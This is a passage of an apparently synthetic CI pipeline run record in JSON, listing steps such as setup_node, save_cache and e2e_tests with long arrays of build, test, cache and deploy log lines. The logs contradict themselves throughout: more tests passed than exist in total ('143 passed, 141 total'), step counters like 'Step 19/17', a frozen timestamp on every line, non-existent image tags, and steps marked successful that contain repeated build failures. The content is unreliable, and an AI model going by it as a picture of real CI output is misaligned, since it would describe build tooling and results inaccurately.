          "  PASS: test_auth_login (152ms)",
          "pip: Collecting react",
          "[12:46:59] INFO: Starting build process",
          "\u2713 Task completed in 2517ms",
          "Compiling utils/utils.go...",
          "Artifact downloaded: 8MB",
          "Generating source maps...",
          "Switched to branch 'bugfix/task-115'",
          "[12:46:59] DEBUG: Query executed in 27ms",
          "Cache restored successfully (434MB)",
          "Compiling utils/handler.rs...",
          "Switched to branch 'bugfix/task-791'",
          "POST /api - 202 (242ms)",
          "npm notice: created a lockfile",
          "\u2713 Step 'build' succeeded",
          "TLS handshake completed",
          "Checking out develop branch",
          "Step 15/17: Installing dependencies",
          "WARNING: react has known vulnerabilities",
          "Tests: 443 passed, 450 total",
          "\u2717 build failed with exit code 109",
          "\u2713 All checks passed",
          "Done.",
          "Step 19/17: Deploying",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Already up to date.",
          "Using Node.js 14.12.10",
          "Cache hit for key-8159",
          "Done.",
          "[12:46:59] INFO: Connecting to database",
          "Cache hit for key-3657",
          "pip install: Successfully installed prettier-1.15",
          "Step 11/24: Linting",
          "[12:46:59] WARN: Deprecated API usage",
          "[12:46:59] WARN: Deprecated API usage",
          "[12:46:59] INFO: Request completed",
          "Uploading artifact 'build' (50 files)",
          "TLS handshake completed",
          "[12:46:59] DEBUG: Query executed in 56ms",
          "[12:46:59] INFO: Request completed",
          "\u2713 All checks passed",
          "pip: Collecting express",
          "[12:46:59] WARN: Deprecated API usage",
          "Transforming 526 files...",
          "Generating source maps...",
          "[12:46:59] DEBUG: Connection pool: 12 active",
          "npm notice: created a lockfile",
          "[12:46:59] DEBUG: Query executed in 62ms",
          "Generating source maps...",
          "[12:46:59] INFO: Connecting to database",
          "\u2713 validate completed",
          "[12:46:59] DEBUG: Connection pool: 16 active",
          "\u2713 Task completed in 2345ms",
          "Loading...",
          "Artifact uploaded: dist.zip (53MB)",
          "Pushing to registry...",
          "Compiling src/app.ts...",
          "[12:46:59] WARN: Deprecated API usage",
          "Fetching from https://amazonaws.com/package.json",
          "Minifying main.js",
          "[12:46:59] DEBUG: Memory usage: 1776MB",
          "[12:46:59] INFO: Request completed",
          "Success!",
          "Test Suites: 29 passed, 17 total",
          "\u2717 build failed with exit code 51",
          "Step 1/18: Linting",
          "Tests: 143 passed, 141 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Switched to branch 'bugfix/task-723'",
          "Pushing to registry...",
          "Installing lodash@1.12.4",
          "Switched to branch 'hotfix/task-615'",
          "npm notice: package.json updated",
          "POST /data - 200 (240ms)",
          "Step 10/25: Deploying",
          "Transforming 612 files...",
          "Step 13/25: Installing dependencies",
          "Layer 9/8: RUN command",
          "  PASS: e2e/test_auth_login.spec.js",
          "Connection established",
          "Cache invalidated: build",
          "Bundling main.js",
          "Ran 158 tests in 45s",
          "Building Docker image...",
          "Time: 36.542s",
          "pip: Installing build dependencies...",
          "npm install: resolved 686 packages",
          "Cache restored successfully (17MB)",
          "Step 18/24: Deploying",
          "[12:46:59] INFO: Starting build process",
          "Image pulled successfully",
          "Step 10/18: Linting",
          "Step 1/21: Testing",
          "Platform: linux-x64",
          "pip: Downloading lodash-3.8.tar.gz",
          "[12:46:59] INFO: Cache refreshed",
          "Layer 1/13: ENV command",
          "Compiling components/index.js...",
          "npm install: added 265 packages",
          "[12:46:59] INFO: Request completed",
          "Compiling components/app.ts...",
          "npm install: resolved 826 packages",
          "Step 12/20: Linting",
          "Tests: 101 passed, 203 total",
          "\u2713 All checks passed",
          "Cache invalidated: dependencies",
          "pip: Collecting jest",
          "\u2713 All checks passed",
          "Completed.",
          "[12:46:59] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/handler.rs...",
          "Compiling src/service.java...",
          "\u2717 build failed with exit code 81",
          "Using Node.js 16.13.3",
          "  PASS: test_api_health (377ms)",
          "[12:46:59] INFO: Cache refreshed",
          "Waiting...",
          "Using Python 3.11",
          "\u2717 build failed with exit code 2",
          "Artifact uploaded: dist.zip (7MB)",
          "WARNING: express has known vulnerabilities",
          "Cache invalidated: node_modules",
          "Building Docker image...",
          "[12:46:59] WARN: Deprecated API usage",
          "Connection established",
          "npm notice: created a lockfile",
          "[12:46:59] DEBUG: Memory usage: 1120MB",
          "[12:46:59] DEBUG: Initializing service",
          "[12:46:59] DEBUG: Memory usage: 1917MB",
          "Snapshots: 23 passed, 20 total",
          "Compiling src/handler.rs...",
          "Processing...",
          "Processing...",
          "Switched to branch 'bugfix/task-378'",
          "pip: Downloading eslint-4.8.tar.gz",
          "Step 3/22: Running migrations",
          "[12:46:59] INFO: Starting build process",
          "[12:46:59] WARN: Deprecated API usage",
          "[12:46:59] ERROR: Connection failed",
          "Coverage: 82% statements, 93% branches",
          "[12:46:59] DEBUG: Connection pool: 10 active",
          "Creating production build...",
          "Transforming 987 files...",
          "\u2713 All checks passed",
          "Done.",
          "Processing...",
          "Layer 5/11: ENV command",
          "Platform: win32-x64",
          "Step 9/20: Installing dependencies",
          "Compiling lib/utils.go...",
          "Connection established",
          "Pushing to registry...",
          "Already up to date.",
          "Environment: production",
          "GET /health - 204 (42ms)",
          "Done.",
          "Finished.",
          "pip: Downloading webpack-3.20.tar.gz",
          "pip: Downloading webpack-5.14.tar.gz",
          "pip: Collecting eslint",
          "Checking out develop branch",
          "[12:46:59] DEBUG: Memory usage: 1135MB",
          "npm notice: created a lockfile",
          "\u2717 build failed with exit code 61",
          "npm notice: created a lockfile",
          "Cache miss for key-8741",
          "Verifying...",
          "\u2713 All checks passed",
          "pip: Installing build dependencies...",
          "Step 6/25: Testing",
          "Artifact uploaded: build.tar.gz (7MB)",
          "[12:46:59] DEBUG: Loading configuration",
          "Step 20/22: Running migrations",
          "pip: Downloading react-5.2.tar.gz",
          "Switched to branch 'hotfix/task-816'",
          "Switched to branch 'bugfix/task-835'",
          "Cache hit for key-1142",
          "Snapshots: 15 passed, 28 total",
          "  PASS: test_db_connect (405ms)",
          "Using Python 3.9",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-02T12:47:44.476635",
        "finished_at": "2025-12-02T12:47:59.398436",
        "log_lines": [
          "=== Step: setup_node ===",
          "Transforming 458 files...",
          "OK",
          "yarn add: Done in 15.46s",
          "WARNING: react has known vulnerabilities",
          "pip: Collecting react",
          "  PASS: integration/test_user_create.spec.js",
          "Bundling styles.js",
          "Cache invalidated: build",
          "Step 4/20: Building",
          "pip: Installing build dependencies...",
          "Step 19/20: Installing dependencies",
          "[12:46:59] INFO: Starting build process",
          "Artifact downloaded: 30MB",
          "POST /api - 202 (39ms)",
          "Creating production build...",
          "FAILED: test_user_create",
          "Connection established",
          "Tests: 446 passed, 218 total",
          "Artifact uploaded: dist.zip (68MB)",
          "WARNING: react has known vulnerabilities",
          "Step 8/23: Linting",
          "Cache invalidated: dependencies",
          "Platform: darwin-arm64",
          "Connection established",
          "pip: Installing build dependencies...",
          "Compiling lib/handler.rs...",
          "[12:46:59] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "pip: Installing build dependencies...",
          "[12:46:59] INFO: Processing request",
          "Building Docker image...",
          "Pulling image: python:3.11",
          "pip: Collecting axios",
          "pip: Installing build dependencies...",
          "Coverage: 87% statements, 75% branches",
          "Artifact downloaded: 2MB",
          "Fetching from https://amazonaws.com/package.json",
          "[12:46:59] INFO: Cache refreshed",
          "Using Node.js 17.12.4",
          "yarn add: Done in 9.87s",
          "Building Docker image...",
          "Cache invalidated: build",
          "NODE_ENV=production",
          "TLS handshake completed",
          "NODE_ENV=production",
          "Installing react@1.3.1",
          "Test Suites: 30 passed, 8 total",
          "OK",
          "[12:46:59] DEBUG: Query executed in 39ms",
          "Compiling lib/handler.rs...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Generating source maps...",
          "\u2713 Step 'build' succeeded",
          "pip: Collecting webpack",
          "Checking out main branch",
          "Snapshots: 35 passed, 29 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 6/24: Building",
          "Cache restored successfully (310MB)",
          "Verifying...",
          "Success!",
          "[12:46:59] INFO: Starting build process",
          "Layer 1/11: ENV command",
          "Time: 17.530s",
          "Pushing to registry...",
          "Connection established",
          "WARNING: axios has known vulnerabilities",
          "Pulling image: alpine:18",
          "Compiling src/utils.go...",
          "Waiting...",
          "pip: Collecting webpack",
          "Using Python 3.12",
          "Minifying main.js",
          "Finished.",
          "Cache saved successfully",
          "Step 4/23: Building",
          "Optimizing 95 modules...",
          "npm notice: created a lockfile",
          "[12:46:59] DEBUG: Connection pool: 10 active",
          "[12:46:59] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Uploading artifact 'build' (10 files)",
          "[12:46:59] ERROR: Connection failed",
          "Using Python 3.10",
          "OK",
          "[12:46:59] DEBUG: Loading configuration",
          "Processing...",
          "[12:46:59] INFO: Request completed",
          "Cache hit for key-3461",
          "Using Python 3.10",
          "Generating source maps...",
          "pip: Collecting webpack",
          "[12:46:59] INFO: Starting build process",
          "Step 5/15: Running migrations",
          "Ran 27 tests in 50s",
          "[12:46:59] WARN: Deprecated API usage",
          "\u2713 Task completed in 2626ms",
          "Ran 89 tests in 29s",
          "Environment: staging",
          "[12:46:59] DEBUG: Loading configuration",
          "Done.",
          "  PASS: test_db_connect (29ms)",
          "[12:46:59] DEBUG: Initializing service",
          "Cache restored successfully (97MB)",
          "[12:46:59] DEBUG: Memory usage: 885MB",
          "npm notice: created a lockfile",
          "Loading...",
          "yarn add: Done in 21.84s",
          "Pushing to registry...",
          "POST /upload - 200 (482ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing axios@1.15.0",
          "Cache hit for key-6934",
          "Uploading artifact 'dist' (10 files)",
          "Image pulled successfully",
          "[12:46:59] DEBUG: Initializing service",
          "Optimizing 86 modules...",
          "Compiling utils/index.js...",
          "WARNING: lodash has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Pushing to registry...",
          "Creating production build...",
          "Using Python 3.10",
          "  PASS: e2e/test_api_health.spec.js",
          "Compiling utils/handler.rs...",
          "\u2717 build failed with exit code 98",
          "[12:46:59] ERROR: Connection failed",
          "[12:46:59] INFO: Starting build process",
          "Cache invalidated: dependencies",
          "NODE_ENV=test",
          "Pushing to registry...",
          "Ready.",
          "Compiling lib/index.js...",
          "npm install: resolved 998 packages",
          "Verifying...",
          "pip: Collecting webpack",
          "Already up to date.",
          "Connection established",
          "[12:46:59] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "Step 7/20: Running migrations",
          "Checking out main branch",
          "[12:46:59] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing express@2.15.7",
          "Fetching submodules...",
          "Coverage: 97% statements, 71% branches",
          "\u2713 Step 'checkout' succeeded",
          "Ran 174 tests in 31s",
          "\u2713 Task completed in 3483ms",
          "[12:46:59] DEBUG: Loading configuration",
          "Step 16/17: Building",
          "[12:46:59] INFO: Starting build process",
          "Test Suites: 9 passed, 41 total",
          "Layer 9/11: COPY command",
          "Fetching from https://github.com/package.json",
          "[12:46:59] INFO: Starting build process",
          "npm install: added 491 packages",
          "WARNING: prettier has known vulnerabilities",
          "Loading...",
          "Success!",
          "Step 8/18: Installing dependencies",
          "[12:46:59] WARN: Deprecated API usage",
          "Step 14/25: Building",
          "Installing lodash@5.18.2",
          "\u2713 lint completed",
          "\u2713 Step 'setup' succeeded",
          "Success!",
          "Success!",
          "pip: Installing build dependencies...",
          "Tests: 99 passed, 52 total",
          "Step 20/24: Testing",
          "\u2713 Step 'build' succeeded",
          "Bundling styles.css",
          "TLS handshake completed",
          "npm install: resolved 1904 packages",
          "OK",
          "Step 6/25: Linting",
          "Fetching from https://pypi.org/package.json",
          "Transforming 727 files...",
          "pip: Installing build dependencies...",
          "Step 7/25: Testing",
          "npm notice: package.json updated",
          "Uploading artifact 'build' (46 files)",
          "Creating production build...",
          "Transforming 289 files...",
          "Step 10/19: Deploying",
          "[12:46:59] DEBUG: Initializing service",
          "Step 20/23: Installing dependencies",
          "[12:46:59] DEBUG: Loading configuration",
          "\u2713 Task completed in 345ms",
          "Artifact uploaded: dist.zip (20MB)",
          "Environment: test",
          "pip: Downloading express-1.16.tar.gz",
          "Step 17/24: Testing",
          "Artifact uploaded: build.tar.gz (23MB)",
          "yarn add: Done in 22.35s",
          "Exception: TypeError",
          "Exception: NullPointerException",
          "[12:46:59] DEBUG: Query executed in 75ms",
          "WARNING: webpack has known vulnerabilities",
          "Fetching from https://githubusercontent.com/package.json",
          "Step 3/17: Building",
          "Time: 118.3s",
          "Step 4/20: Running migrations",
          "pip: Downloading jest-2.11.tar.gz",
          "[12:46:59] INFO: Request completed",
          "[12:46:59] ERROR: Connection failed",
          "[12:46:59] DEBUG: Memory usage: 858MB",
          "Finished.",
          "pip: Collecting lodash",
          "Ready.",
          "npm notice: package.json updated",
          "Pulling image: python:18",
          "Checking out main branch",
          "Uploading artifact 'coverage' (41 files)",
          "Image pulled successfully",
          "POST /upload - 200 (450ms)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Artifact downloaded: 26MB",
          "Snapshots: 40 passed, 44 total",
          "Layer 1/12: ENV command",
          "Done.",
          "[12:46:59] DEBUG: Query executed in 17ms",
          "[12:46:59] ERROR: Connection failed",
          "Connection established",
          "[12:46:59] ERROR: Connection failed",
          "Transforming 679 files...",
          "npm notice: created a lockfile",
          "Completed.",
          "  PASS: test_auth_login (53ms)",
          "pip: Collecting express",
          "Pushing to registry...",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-02T12:47:59.398436",
        "finished_at": "2025-12-02T12:48:08.351517",
        "log_lines": [
          "=== Step: save_cache ===",
          "Artifact uploaded: build.tar.gz (21MB)",
          "\u2713 deploy completed",
          "Fetching from https://gcr.io/package.json",
          "Step 17/19: Testing",
          "Compiling components/app.ts...",
          "[12:46:59] INFO: Starting build process",
          "  PASS: test_cache_hit (148ms)",
          "Uploading artifact 'coverage' (34 files)",
          "[12:46:59] DEBUG: Memory usage: 899MB",
          "Switched to branch 'bugfix/task-831'",
          "Success!",
          "[12:46:59] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:59] DEBUG: Query executed in 42ms",
          "Cache restored successfully (104MB)",
          "Step 16/19: Running migrations",
          "[12:46:59] DEBUG: Initializing service",
          "POST /api - 200 (286ms)",
          "Building Docker image...",
          "Snapshots: 42 passed, 3 total",
          "Artifact downloaded: 41MB",
          "Done.",
          "OK",
          "pip: Downloading eslint-1.8.tar.gz",
          "Cache hit for key-4450",
          "\u2713 test completed",
          "Artifact uploaded: dist.zip (24MB)",
          "\u2717 build failed with exit code 118",
          "[12:46:59] INFO: Cache refreshed",
          "[12:46:59] INFO: Connecting to database",
          "  PASS: test_user_create (307ms)",
          "Pushing to registry...",
          "Using Node.js 14.4.0",
          "[12:46:59] INFO: Connecting to database",
          "Cache miss for key-4511",
          "Image pulled successfully",
          "[12:46:59] INFO: Request completed",
          "[12:46:59] DEBUG: Initializing service",
          "Cache restored successfully (179MB)",
          "\u2713 Task completed in 4458ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 17/20: Running migrations",
          "OK",
          "  PASS: unit/test_db_connect.spec.js",
          "[12:46:59] INFO: Cache refreshed",
          "Using Python 3.12",
          "Ready.",
          "Processing...",
          "Step 20/16: Building",
          "Done.",
          "Compiling src/main.py...",
          "pip: Downloading axios-2.19.tar.gz",
          "Uploading artifact 'dist' (6 files)",
          "Transforming 301 files...",
          "Success!",
          "pip: Installing build dependencies...",
          "Test Suites: 7 passed, 22 total",
          "Checking out master branch",
          "[12:46:59] WARN: Deprecated API usage",
          "Done.",
          "Creating production build...",
          "Compiling components/handler.rs...",
          "Snapshots: 20 passed, 31 total",
          "Step 4/23: Linting",
          "Cache miss for key-8614",
          "[12:46:59] INFO: Connecting to database",
          "FAILED: test_auth_login",
          "yarn add: Done in 21.57s",
          "Using Python 3.11",
          "  PASS: test_api_health (299ms)",
          "[12:46:59] DEBUG: Connection pool: 5 active",
          "Compiling lib/service.java...",
          "[12:46:59] DEBUG: Connection pool: 11 active",
          "Using Node.js 18.17.8",
          "NODE_ENV=test",
          "Processing...",
          "WARNING: react has known vulnerabilities",
          "Compiling utils/utils.go...",
          "\u2713 Step 'install' succeeded",
          "pip: Collecting lodash",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Completed.",
          "[12:46:59] DEBUG: Loading configuration",
          "Step 20/16: Installing dependencies",
          "Fetching from https://npmjs.org/package.json",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache invalidated: dependencies",
          "NODE_ENV=production",
          "Bundling main.css",
          "[12:46:59] INFO: Processing request",
          "[12:46:59] DEBUG: Loading configuration",
          "Time: 83.699s",
          "Compiling components/service.java...",
          "npm install: resolved 1638 packages",
          "Step 12/24: Installing dependencies",
          "Installing prettier@3.17.1",
          "Completed.",
          "Ready.",
          "pip: Collecting express",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Generating source maps...",
          "[12:46:59] INFO: Connecting to database",
          "Coverage: 83% statements, 70% branches",
          "Compiling lib/service.java...",
          "Ready.",
          "Checking out main branch",
          "OK",
          "Step 12/23: Testing",
          "Cache miss for key-4283",
          "npm notice: created a lockfile",
          "Step 16/23: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 validate completed",
          "Transforming 340 files...",
          "HEAD is now at 1ac2e03",
          "Generating source maps...",
          "Using Node.js 15.12.2",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Task completed in 4475ms",
          "Platform: linux-x64",
          "Ready.",
          "Snapshots: 33 passed, 16 total",
          "Cache hit for key-9341",
          "[12:46:59] DEBUG: Loading configuration",
          "[12:46:59] INFO: Request completed",
          "Artifact downloaded: 16MB",
          "Success!",
          "Step 2/23: Linting",
          "Artifact downloaded: 11MB",
          "Cache saved successfully",
          "Artifact downloaded: 3MB",
          "Pushing to registry...",
          "GET /status - 204 (47ms)",
          "\u2713 Task completed in 3500ms",
          "[12:46:59] DEBUG: Query executed in 66ms",
          "Verifying...",
          "Cache hit for key-1503",
          "pip: Collecting jest",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 2/24: Testing",
          "  PASS: unit/test_api_health.spec.js",
          "GET /api - 204 (21ms)",
          "Artifact uploaded: dist.zip (52MB)",
          "OK",
          "Processing...",
          "  PASS: test_db_connect (200ms)",
          "[12:46:59] INFO: Starting build process",
          "Optimizing 99 modules...",
          "Pushing to registry...",
          "Already up to date.",
          "Step 10/19: Deploying",
          "[12:46:59] INFO: Connecting to database",
          "Using Node.js 14.3.9",
          "NODE_ENV=development",
          "Step 3/21: Installing dependencies",
          "Platform: linux-x64",
          "Installing lodash@5.4.7",
          "Compiling lib/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:59] WARN: Deprecated API usage",
          "Layer 8/15: ENV command",
          "Finished.",
          "Platform: win32-x64",
          "Test Suites: 29 passed, 39 total",
          "Success!",
          "Step 17/18: Building",
          "Processing...",
          "Cache hit for key-8903",
          "Coverage: 88% statements, 83% branches",
          "Snapshots: 48 passed, 23 total",
          "[12:46:59] DEBUG: Memory usage: 1803MB",
          "npm install: resolved 1645 packages",
          "TLS handshake completed",
          "pip: Collecting axios",
          "Step 14/23: Testing",
          "Step 6/16: Running migrations",
          "[12:46:59] ERROR: Connection failed",
          "Checking out main branch",
          "Minifying app.js",
          "Layer 9/10: ENV command",
          "Bundling vendor.js",
          "\u2713 Task completed in 1392ms",
          "\u2717 build failed with exit code 99",
          "[12:46:59] WARN: Deprecated API usage",
          "Cache invalidated: node_modules",
          "Compiling utils/app.ts...",
          "Transforming 201 files...",
          "  PASS: test_db_connect (270ms)",
          "Snapshots: 50 passed, 22 total",
          "Verifying...",
          "Switched to branch 'hotfix/task-110'",
          "Layer 9/15: COPY command",
          "Completed.",
          "Cache restored successfully (273MB)",
          "Checking out main branch",
          "Loading...",
          "npm notice: created a lockfile",
          "Creating production build...",
          "OK",
          "Ready.",
          "Already up to date.",
          "npm install: added 290 packages",
          "Fetching submodules...",
          "Platform: darwin-arm64",
          "Compiling components/main.py...",
          "Step 8/21: Deploying",
          "TLS handshake completed",
          "Compiling src/service.java...",
          "Step 9/15: Deploying",
          "Step 2/17: Installing dependencies",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Building Docker image...",
          "Step 15/19: Installing dependencies",
          "Compiling components/utils.go...",
          "npm notice: created a lockfile",
          "Cache invalidated: dependencies",
          "Coverage: 87% statements, 90% branches",
          "Step 12/24: Running migrations",
          "Test Suites: 14 passed, 36 total",
          "Uploading artifact 'build' (25 files)",
          "Building Docker image...",
          "[12:46:59] INFO: Connecting to database",
          "Snapshots: 12 passed, 0 total",
          "Layer 10/13: COPY command",
          "Checking out master branch",
          "Tests: 245 passed, 398 total",
          "yarn add: Done in 9.24s",
          "[12:46:59] INFO: Cache refreshed",
          "Ready.",
          "Platform: win32-x64",
          "Installing jest@2.14.8",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-02T12:48:08.351517",
        "finished_at": "2025-12-02T12:48:23.273318",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Optimizing 91 modules...",
          "Loading...",
          "Done.",
          "Ready.",
          "[12:46:59] DEBUG: Memory usage: 1251MB",
          "Time: 97.261s",
          "[12:46:59] DEBUG: Loading configuration",
          "yarn add: Done in 22.95s",
          "Step 6/16: Deploying",
          "Transforming 331 files...",
          "Already up to date.",
          "Cache restored successfully (230MB)",
          "Bundling vendor.js",
          "pip: Downloading webpack-3.10.tar.gz",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:46:59] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "Step 10/18: Installing dependencies",
          "Switched to branch 'bugfix/task-579'",
          "Step 18/22: Building",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 38",
          "Step 9/15: Deploying",
          "npm notice: created a lockfile",
          "[12:46:59] INFO: Cache refreshed",
          "\u2717 build failed with exit code 101",
          "Done.",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm install: added 438 packages",
          "[12:46:59] INFO: Request completed",
          "HEAD is now at 087c081",
          "pip: Installing build dependencies...",
          "HEAD is now at 6caaa8f",
          "Environment: production",
          "\u2713 Task completed in 3764ms",
          "Artifact downloaded: 36MB",
          "\u2717 build failed with exit code 44",
          "Snapshots: 45 passed, 5 total",
          "Compiling lib/main.py...",
          "Connection established",
          "Minifying app.js",
          "\u2713 Step 'build' succeeded",
          "Minifying main.js",
          "Connection established",
          "Test Suites: 45 passed, 18 total",
          "[12:46:59] INFO: Cache refreshed",
          "  PASS: integration/test_db_connect.spec.js",
          "Test Suites: 27 passed, 5 total",
          "Generating source maps...",
          "[12:46:59] ERROR: Connection failed",
          "Step 10/18: Installing dependencies",
          "Waiting...",
          "Cache hit for key-6370",
          "[12:46:59] INFO: Cache refreshed",
          "Pushing to registry...",
          "Cache miss for key-9905",
          "Cache miss for key-5644",
          "Cache invalidated: build",
          "Step 10/20: Deploying",
          "[12:46:59] DEBUG: Connection pool: 2 active",
          "Step 8/25: Deploying",
          "Layer 5/14: COPY command",
          "[12:46:59] DEBUG: Loading configuration",
          "Fetching from https://gcr.io/package.json",
          "GET /health - 204 (51ms)",
          "[12:46:59] DEBUG: Memory usage: 1393MB",
          "Step 15/24: Installing dependencies",
          "Artifact uploaded: build.tar.gz (30MB)",
          "NODE_ENV=test",
          "Step 18/21: Deploying",
          "Compiling src/utils.go...",
          "Pulling image: node:18",
          "Step 8/17: Installing dependencies",
          "npm notice: created a lockfile",
          "npm notice: package.json updated",
          "Step 3/15: Running migrations",
          "Cache saved successfully",
          "OK",
          "Generating source maps...",
          "Compiling lib/app.ts...",
          "Cache hit for key-6453",
          "Connection established",
          "POST /data - 201 (402ms)",
          "[12:46:59] INFO: Starting build process",
          "Compiling components/handler.rs...",
          "Minifying app.js",
          "[12:46:59] INFO: Request completed",
          "[12:46:59] INFO: Request completed",
          "[12:46:59] DEBUG: Memory usage: 132MB",
          "Transforming 867 files...",
          "Installing react@1.17.8",
          "Fetching submodules...",
          "Layer 5/8: ENV command",
          "Minifying main.js",
          "  PASS: test_db_connect (193ms)",
          "Loading...",
          "Step 20/25: Running migrations",
          "Processing...",
          "Verifying...",
          "Fetching from https://githubusercontent.com/package.json",
          "Cache miss for key-9878",
          "\u2713 All checks passed",
          "Step 14/20: Linting",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "FAILED: test_cache_hit",
          "[12:46:59] DEBUG: Initializing service",
          "POST /upload - 200 (414ms)",
          "Step 12/21: Running migrations",
          "\u2717 build failed with exit code 65",
          "Cache restored successfully (127MB)",
          "Ran 143 tests in 45s",
          "npm notice: created a lockfile",
          "Exception: TypeError",
          "POST /upload - 201 (231ms)",
          "Tests: 448 passed, 292 total",
          "pip install: Successfully installed axios-3.5",
          "\u2713 validate completed",
          "Compiling lib/main.py...",
          "TLS handshake completed",
          "\u2713 All checks passed",
          "\u2717 build failed with exit code 83",
          "TLS handshake completed",
          "Cache invalidated: dependencies",
          "Artifact downloaded: 15MB",
          "Bundling styles.css",
          "WARNING: react has known vulnerabilities",
          "Layer 7/10: COPY command",
          "Fetching from https://npmjs.org/package.json",
          "Fetching from https://githubusercontent.com/package.json",
          "WARNING: axios has known vulnerabilities",
          "\u2713 Step 'build' succeeded",
          "Image pulled successfully",
          "Pulling image: node:latest",
          "Compiling lib/app.ts...",
          "POST /upload - 202 (487ms)",
          "Test Suites: 8 passed, 49 total",
          "Pulling image: alpine:18",
          "\u2713 test completed",
          "[12:46:59] INFO: Request completed",
          "pip install: Successfully installed jest-2.7",
          "Artifact uploaded: dist.zip (89MB)",
          "Installing lodash@3.16.8",
          "Cache miss for key-5596",
          "Generating source maps...",
          "Pushing to registry...",
          "[12:46:59] INFO: Starting build process",
          "GET /status - 204 (8ms)",
          "pip: Collecting prettier",
          "Compiling lib/main.py...",
          "Step 8/24: Running migrations",
          "Already up to date.",
          "Finished.",
          "Finished.",
          "Time: 86.745s",
          "Time: 7.863s",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:46:59] DEBUG: Loading configuration",
          "Using Node.js 20.19.2",
          "Cache hit for key-8339",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Finished.",
          "pip: Collecting react",
          "Exception: RuntimeError",
          "Ready.",
          "\u2713 lint completed",
          "HEAD is now at 2c07da1",
          "\u2713 Step 'build' succeeded",
          "TLS handshake completed",
          "[12:46:59] INFO: Request completed",
          "\u2717 build failed with exit code 14",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Transforming 293 files...",
          "\u2713 lint completed",
          "Already up to date.",
          "pip install: Successfully installed axios-4.18",
          "Step 2/16: Installing dependencies",
          "Step 9/24: Installing dependencies",
          "Uploading artifact 'dist' (30 files)",
          "GET /status - 204 (56ms)",
          "Building Docker image...",
          "Cache saved successfully",
          "Snapshots: 25 passed, 31 total",
          "Connection established",
          "Snapshots: 41 passed, 24 total",
          "Optimizing 59 modules...",
          "Artifact uploaded: dist.zip (48MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 6/25: Building",
          "Done.",
          "Transforming 254 files...",
          "Step 1/20: Installing dependencies",
          "Already up to date.",
          "Cache hit for key-6829",
          "[12:46:59] INFO: Starting build process",
          "Platform: darwin-arm64",
          "Waiting...",
          "Already up to date.",
          "Done.",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Compiling utils/main.py...",
          "Step 2/25: Linting",
          "Ran 156 tests in 20s",
          "Step 6/17: Running migrations",
          "Step 6/15: Building",
          "Cache restored successfully (73MB)",
          "Artifact uploaded: dist.zip (81MB)",
          "Cache invalidated: build",
          "Switched to branch 'hotfix/task-839'",
          "npm notice: created a lockfile",
          "[12:46:59] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Using Node.js 20.12.1",
          "WARNING: jest has known vulnerabilities",
          "Building Docker image...",
          "Already up to date.",
          "Uploading artifact 'build' (43 files)",
          "NODE_ENV=test",
          "Step 12/22: Linting",
          "[12:46:59] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Processing...",
          "NODE_ENV=test",
          "Compiling components/index.js...",
          "Success!",
          "[12:46:59] DEBUG: Memory usage: 1294MB",
          "HEAD is now at ab594cc",
          "Using Node.js 19.11.3",
          "Step 13/18: Testing",
          "WARNING: axios has known vulnerabilities",
          "pip install: Successfully installed eslint-5.16",
          "Waiting...",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-02T12:48:23.273318",
        "finished_at": "2025-12-02T12:48:38.195119",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Step 2/20: Deploying",
          "Compiling components/app.ts...",
          "Processing...",
          "OK",
          "Step 15/16: Installing dependencies",
          "Time: 92.277s",
          "[12:46:59] WARN: Deprecated API usage",
          "[12:46:59] WARN: Deprecated API usage",
          "Layer 9/9: RUN command",
          "Generating source maps...",
          "Step 7/18: Testing",
          "FAILED: test_auth_login",
          "[12:46:59] INFO: Processing request",
          "npm notice: created a lockfile",
          "Verifying...",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "yarn add: Done in 4.63s",
          "  PASS: test_api_health (114ms)",
